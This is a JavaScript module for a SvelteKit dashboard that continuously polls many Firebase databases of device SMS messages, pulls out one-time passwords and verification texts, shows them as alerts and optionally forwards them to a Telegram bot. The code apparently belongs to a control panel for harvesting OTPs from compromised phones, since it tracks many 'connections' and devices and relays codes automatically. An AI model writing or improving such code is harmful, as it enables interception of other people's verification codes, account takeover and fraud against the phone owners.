/**
 * Background Panel Poller — Persistent singleton across SvelteKit route navigation.
 *
 * Responsibilities:
 * 1. Maintains reactive `pollerState.db` so dashboard renders instantly without blank-page delays.
 * 2. Continuously polls all enabled Firebase connections in the background (every 30s) across all routes.
 * 3. Uses bounded concurrency (16 connections at a time) and yields to the browser event loop
 *    between batches (`setTimeout(0)`) so user navigation clicks are never frozen or delayed.
 * 4. Catches incoming SMS / OTPs in real-time via a SEPARATE 10s notification-only poll loop.
 * 5. Respects OTP forwarding toggle and target bot settings.
 * 6. Zero-duplicate guarantee: all seen message keys are persisted to localStorage and checked
 *    before any notification is fired, even across page refreshes.
 */

import { apiFetch } from '$lib/firebase.js';
import { extractOTP, isVerificationMsg, extractAbout } from '$lib/utils/sms.js';
import { isForwardOtpEnabled, tgForwardOTP } from '$lib/tg-forwarder.js';

const FULL_REFRESH_INTERVAL_SECS = 30;
const NOTIF_POLL_INTERVAL_MS = 10000;  // Separate 10s notification-only poll
const BATCH_SIZE = 16;
const NOTIF_DURATION_MS = 90000;
const isBrowser = typeof window !== 'undefined';

// ── Persistent Reactive Singleton ──────────────────────────────────────────
export const pollerState = $state({
  db: {},                   // { [connId]: { loading, error, deactivated, keys, info, ts } }
  isRefreshing: false,      // true when active batch refresh is running
  lastRefresh: null,        // Date of last completed refresh
  nextRefreshSecs: FULL_REFRESH_INTERVAL_SECS,
  initialized: false
});

let _pollInterval = null;
let _countdownTicker = null;
let _notifPollInterval = null;  // Dedicated 10s notification-only interval
let _isPolling = false;
let _isNotifPolling = false;    // Guard for notification-only poll
let _abortController = null;
function initSeenMessageKeys() {
  const set = new Set();
  if (!isBrowser) return set;
  try {
    const raw = localStorage.getItem('pd_notif_seen');
    if (raw) {
      const arr = JSON.parse(raw);
      if (Array.isArray(arr)) {
        for (const k of arr) set.add(k);
      }
    }
  } catch {}
  return set;
}

function markMessageKeySeen(key) {
  _seenMessageKeys.add(key);
  if (!isBrowser) return;
  try {
    const arr = [..._seenMessageKeys];
    if (arr.length > 500) arr.splice(0, arr.length - 500);
    localStorage.setItem('pd_notif_seen', JSON.stringify(arr));
  } catch {}
}

const _seenMessageKeys = initSeenMessageKeys();
const _baselineDeviceKeys = new Set();

/** Get active connections list from localStorage */
export function getStoredConnections() {
  if (!isBrowser) return [];
  try {
    const raw = localStorage.getItem('pd_connections');
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return parsed;
    }
  } catch {}
  return [];
}

/** Helper sleep that yields control to the browser microtask/event queue */
function yieldToEventLoop() {
  return new Promise((r) => setTimeout(r, 0));
}

// ── Notification Helpers ───────────────────────────────────────────────────
function saveActiveNotification(notif) {
  if (!isBrowser || !notif) return;
  try {
    const raw = localStorage.getItem('pd_active_notifs');
    let list = [];
    if (raw) {
      try { list = JSON.parse(raw); } catch { list = []; }
    }
    const now = Date.now();
    // Keep notifications within duration
    const valid = list.filter((n) => n && (now - (Number(n.createdAt) || 0)) < NOTIF_DURATION_MS);
    // Dedup: do not insert if same msgId already stored (race between poll cycles)
    if (notif.msgId && valid.some((n) => n.connId === notif.connId && n.devKey === notif.devKey && n.msgId === notif.msgId)) {
      return;
    }
    valid.unshift(notif);
    localStorage.setItem('pd_active_notifs', JSON.stringify(valid.slice(0, 100)));
  } catch {}
}

/** Check a device for incoming messages/OTPs and dispatch notification */
async function inspectDeviceForOtp(conn, devKey, signal) {
  if (!conn || !devKey) return;
  try {
    const { data } = await apiFetch(
      conn,
      `${conn.path}/${devKey}`,
      'GET',
      undefined,
      { orderBy: '"$key"', limitToLast: '50' }
    );
    if (!data || typeof data !== 'object') return;

    const entries = Object.entries(data).slice(-50);
    for (const [msgId, msg] of entries) {
      if (!msg || typeof msg !== 'object') continue;
      const seenKey = `${conn.id}::${devKey}::${msgId ?? ''}`;
      // Double-check: in-memory set AND localStorage (survives across page navigations)
      if (_seenMessageKeys.has(seenKey)) continue;
      // Re-read localStorage seen set to catch any keys added by page-level addNotif
      if (isBrowser) {
        try {
          const raw = localStorage.getItem('pd_notif_seen');
          if (raw) {
            const arr = JSON.parse(raw);
            if (Array.isArray(arr) && arr.includes(seenKey)) {
              _seenMessageKeys.add(seenKey); // sync into memory
              continue;
            }
          }
        } catch {}
      }
      markMessageKeySeen(seenKey);

      const text = msg.message ?? msg.body ?? msg.text ?? '';
      const otp = extractOTP(text);
      if (!otp && !isVerificationMsg(text)) continue;

      const sender = msg.sender ?? msg.from ?? '?';
      const msgTs = msg.dateTime || msg.timestamp || msg.date || msg.time || new Date().toISOString();
      const now = Date.now();
      const notifObj = {
        id: now + Math.random(),
        createdAt: now,
        ts: msgTs,
        connId: conn.id,
        conn: { id: conn.id, name: conn.name, color: conn.color },
        devKey,
        sender,
        message: text,
        otp,
        about: extractAbout(sender, text),
        msgId
      };

      // Save notification to storage
      saveActiveNotification(notifObj);

      // Dispatch event to any open views (e.g. dashboard bell panel or audio chime)
      if (isBrowser) {
        window.dispatchEvent(new CustomEvent('panel-poller:otp', { detail: notifObj }));
      }

      // If user enabled OTP forwarding, send it
      if (isForwardOtpEnabled()) {
        tgForwardOTP(notifObj);
      }
    }
  } catch {}
}

/** Dedicated notification-only poll: checks all active connections for new OTPs every 10s.
 *  Runs independently of the 30s full data refresh so UI data and notifications are decoupled. */
async function pollNotificationsOnly() {
  if (!isBrowser || _isNotifPolling) return;
  const connections = getStoredConnections();
  const enabled = connections.filter((c) => c.enabled && !pollerState.db[c.id]?.deactivated);
  if (!enabled.length) return;

  _isNotifPolling = true;
  try {
    for (const conn of enabled) {
      if (!conn.infoPath) continue;
      try {
        const { data: infoData } = await apiFetch(conn, conn.infoPath);
        if (!infoData || typeof infoData !== 'object') continue;
        const nowMs = Date.now();
        const prevInfo = pollerState.db[conn.id]?.info ?? {};
        for (const [devKey, devInfo] of Object.entries(infoData)) {
          if (!devInfo || typeof devInfo !== 'object') continue;
          const rawNewTs = devInfo.lastMessageTime ?? devInfo.lastSeen ?? 0;
          const rawPrevTs = prevInfo[devKey]?.lastMessageTime ?? prevInfo[devKey]?.lastSeen ?? 0;
          const newTs = Number(rawNewTs) < 1e11 ? Number(rawNewTs) * 1000 : Number(rawNewTs);
          const prevTs = Number(rawPrevTs) < 1e11 ? Number(rawPrevTs) * 1000 : Number(rawPrevTs);
          const isRecent = newTs && (nowMs - newTs) < NOTIF_DURATION_MS;
          if (newTs && ((prevTs && newTs > prevTs) || (!prevTs && isRecent))) {
            inspectDeviceForOtp(conn, devKey).catch(() => {});
          }
        }
      } catch {}
      // Yield between connections so we don't block UI
      await new Promise((r) => setTimeout(r, 0));
    }
  } finally {
    _isNotifPolling = false;
  }
}

/** Fetch a single connection's shallow keys and info */
async function fetchConnectionData(conn, silent = true, signal) {
  if (!conn || !conn.enabled) return null;
  if (silent && pollerState.db[conn.id]?.deactivated) return null;

  try {
    // 1. Get shallow device keys
    const { data: keysData } = await apiFetch(
      conn,
      conn.path,
      'GET',
      undefined,
      { shallow: 'true' }
    );
    const keys = keysData && typeof keysData === 'object' ? keysData : {};

    // 2. Get device info if infoPath configured
    let info = pollerState.db[conn.id]?.info ?? {};
    const prevInfo = pollerState.db[conn.id]?.info ?? {};
    if (conn.infoPath) {
      try {
        const { data: infoData } = await apiFetch(conn, conn.infoPath);
        if (infoData && typeof infoData === 'object') {
          info = infoData;
          const nowMs = Date.now();
          // Check for recent messages on active devices
          for (const [devKey, devInfo] of Object.entries(infoData)) {
            if (!devInfo || typeof devInfo !== 'object') continue;
            const rawNewTs = devInfo.lastMessageTime ?? devInfo.lastSeen ?? 0;
            const rawPrevTs = prevInfo[devKey]?.lastMessageTime ?? prevInfo[devKey]?.lastSeen ?? 0;
            const newTs = Number(rawNewTs) < 1e11 ? Number(rawNewTs) * 1000 : Number(rawNewTs);
            const prevTs = Number(rawPrevTs) < 1e11 ? Number(rawPrevTs) * 1000 : Number(rawPrevTs);
            const isRecent = newTs && (nowMs - newTs) < NOTIF_DURATION_MS;

            if (newTs && ((prevTs && newTs > prevTs) || (!prevTs && isRecent))) {
              inspectDeviceForOtp(conn, devKey, signal).catch(() => {});
            }
          }
        }
      } catch {}
    }

    // Capture baseline device keys
    for (const k of Object.keys(keys)) {
      _baselineDeviceKeys.add(`${conn.id}::${k}`);
    }

    return {
      connId: conn.id,
      loading: false,
      error: null,
      deactivated: false,
      keys,
      info,
      ts: new Date()
    };
  } catch (e) {
    const isDeact = String(e.message).includes('deactivated') ||
                    String(e.message).includes('423') ||
                    String(e.message).includes('Locked');
    return {
      connId: conn.id,
      loading: false,
      error: isDeact ? 'Database deactivated by Firebase (423 Locked)' : e.message,
      deactivated: isDeact,
      keys: pollerState.db[conn.id]?.keys ?? {},
      info: pollerState.db[conn.id]?.info ?? {},
      ts: new Date()
    };
  }
}

// ── Main Background Polling Function ─────────────────────────────────────────
export async function pollAllConnections(silent = true) {
  if (!isBrowser || _isPolling) return;
  const connections = getStoredConnections();
  const enabled = connections.filter((c) => c.enabled);
  if (!enabled.length) return;

  _isPolling = true;
  pollerState.isRefreshing = true;

  try {
    // Process in gentle batches of 6, yielding to the event loop between batches
    for (let i = 0; i < enabled.length; i += BATCH_SIZE) {
      const chunk = enabled.slice(i, i + BATCH_SIZE);
      const results = await Promise.allSettled(
        chunk.map((conn) => fetchConnectionData(conn, silent))
      );

      // Batch-update pollerState.db once per batch (NOT per individual connection!)
      const batchPatch = {};
      for (const res of results) {
        if (res.status === 'fulfilled' && res.value) {
          batchPatch[res.value.connId] = res.value;
        }
      }

      if (Object.keys(batchPatch).length > 0) {
        pollerState.db = {
          ...pollerState.db,
          ...batchPatch
        };
      }

      // CRITICAL: Yield to browser event loop!
      // This allows user clicks on /automation or /discovery to execute instantly (<10ms)!
      await yieldToEventLoop();
    }

    pollerState.lastRefresh = new Date();
    pollerState.nextRefreshSecs = FULL_REFRESH_INTERVAL_SECS;
  } catch (err) {
    console.warn('[PanelPoller] Background poll encountered error:', err);
  } finally {
    _isPolling = false;
    pollerState.isRefreshing = false;
  }
}

/** Trigger an immediate priority refresh (e.g. user clicked "Refresh All") */
export function triggerManualRefresh() {
  pollerState.nextRefreshSecs = FULL_REFRESH_INTERVAL_SECS;
  return pollAllConnections(false);
}

/** Update or delete a connection from poller state */
export function removeConnFromDb(connId) {
  if (!connId || !pollerState.db[connId]) return;
  const { [connId]: _, ...rest } = pollerState.db;
  pollerState.db = rest;
}

export function updateConnInDb(connId, data) {
  if (!connId || !data) return;
  pollerState.db = {
    ...pollerState.db,
    [connId]: data
  };
}

export function clearPollerDb() {
  pollerState.db = {};
}

// ── Background Poller Engine Starter ─────────────────────────────────────────
export function initBackgroundPoller() {
  if (!isBrowser || pollerState.initialized) return;
  pollerState.initialized = true;

  // 1. Initial gentle background poll on startup
  setTimeout(() => {
    pollAllConnections(true);
  }, 100);

  // 2. Countdown ticker (1s) — drives the 30s full data refresh
  _countdownTicker = setInterval(() => {
    if (pollerState.nextRefreshSecs > 0) {
      pollerState.nextRefreshSecs -= 1;
    } else {
      pollerState.nextRefreshSecs = FULL_REFRESH_INTERVAL_SECS;
      pollAllConnections(true);
    }
  }, 1000);

  // 3. SEPARATE 10s notification-only poll — decoupled from main data refresh.
  //    Checks for new OTPs/SMS without touching pollerState.db or isRefreshing.
  setTimeout(() => {
    pollNotificationsOnly(); // first check after 10s
  }, 10000);
  _notifPollInterval = setInterval(() => {
    pollNotificationsOnly();
  }, NOTIF_POLL_INTERVAL_MS);

  // 4. Tab visibility listener: when user returns to tab, refresh quietly
  const onVisibility = () => {
    if (document.visibilityState === 'visible') {
      if (pollerState.nextRefreshSecs <= 5 || !pollerState.lastRefresh) {
        pollAllConnections(true);
      }
      // Also kick off a quick notification check immediately on tab focus
      pollNotificationsOnly();
    }
  };
  document.addEventListener('visibilitychange', onVisibility);
}
